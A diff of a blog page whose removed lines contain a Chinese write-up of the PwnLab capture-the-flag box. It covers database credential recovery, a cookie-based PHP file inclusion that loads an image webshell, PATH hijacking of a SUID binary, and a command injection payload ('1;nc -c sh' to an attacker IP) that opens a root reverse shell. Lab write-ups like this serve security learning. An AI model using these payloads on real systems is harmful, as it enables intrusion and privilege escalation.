-<p>那还是直接上mysql看看吧</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p -h 192.168.100.169</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/PwnLab/image-20221102161318474.png" alt="image-20221102161318474"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102161257509.png" alt="image-20221102161257509"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102161332481.png" alt="image-20221102161332481"></p>
-<p>解密一下这些账号</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kent JWzXuBJJNy</span><br><span class="line">mike SIfdsTEn6I</span><br><span class="line">kane iSv5Ym2GRo</span><br></pre></td></tr></table></figure>
-
-<p>用这些账号登录一下试一下</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102162916435.png" alt="image-20221102162916435"></p>
-<p>可以上传文件，并且只能传图片，没有解析漏洞，%00,00截断无用。肚子里没水了，只有求助攻略。</p>
-<p>攻略中查看index的源码发现有这么一行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;lang/&quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果cookie中设置了lang，就将其包含进来，那我们就包含我们的图片马就可以了，图片马设置一个执行反弹shell的命令。</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102175447928.png" alt="image-20221102175447928"></p>
-<p>然后在cookie中设置lang字段来进行文件包含操作</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102175506147.png" alt="image-20221102175506147"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102175513963.png" alt="image-20221102175513963"></p>
-<p>成功获取反弹shell</p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>话说不是有个root的mysql吗，尝试udf提权。</p>
-<p>未果</p>
-<p><a href="https://wanheiqiyihu.top/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/"># 利用Escalate_Linux靶机学习11种linux提权 | 十三の博客 (wanheiqiyihu.top)</a></p>
-<p>首先通过<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>建立一个tty</p>
-<p>利用我以前这片文章的思路，进行提权操作。</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102180708682.png" alt="image-20221102180708682"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102180621728.png" alt="image-20221102180621728"></p>
-<p>然后尝试登录上面的账户</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102180652404.png" alt="image-20221102180652404"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102180902366.png" alt="image-20221102180902366"></p>
-<p>当进入kane账户的时候，通过<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现具有suid的文件中有这么个东西</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102180950669.png" alt="image-20221102180950669"></p>
-<p>执行发现是执行的cat命令</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102181046024.png" alt="image-20221102181046024"></p>
-<p>通过环境变量劫持来进行一个提权</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /home/kane</span><br><span class="line">ls</span><br><span class="line">./msgmike</span><br><span class="line">echo $PATH</span><br><span class="line">cd ../../../../../../</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; tmp/cat</span><br><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">echo $PATH  </span><br><span class="line">chmod 755 /tmp/cat</span><br><span class="line">cd /hone/kane</span><br><span class="line">./msgmike</span><br></pre></td></tr></table></figure>
-
-<p>执行之后发现用户已经变成了mike</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102181634138.png" alt="image-20221102181634138"></p>
-<p>又用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现这么个东西</p>
-<p><img src="/2022/11/02/PwnLab/image-20221102181705674.png" alt="image-20221102181705674"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102181940676.png" alt="image-20221102181940676"></p>
-<p>执行之后发现是给root用户发信息的一个东西</p>
-<p>最后还是看了下攻略，都没解释原理，不过原理也很好推测，就是一个命令执行，加了一个分号之后多加了一条命令，直接弹一个root权限的账户回来。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;nc -c sh 192.168.100.129 6667</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/PwnLab/image-20221102182427360.png" alt="image-20221102182427360"></p>
-<p><img src="/2022/11/02/PwnLab/image-20221102182436154.png" alt="image-20221102182436154"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后那个;绕过的提权确实没想到，只能说是情理之中意料之外的吧，要是没有攻略，我可能还是打不到最后一步。还有就是，要善于总结信息，很多漏洞就是从各种信息中分析出来的。最后要是是那种受限的shell，记得弄一个tty。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -706,7 +716,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">175</span>
+          <span class="site-state-item-count">176</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
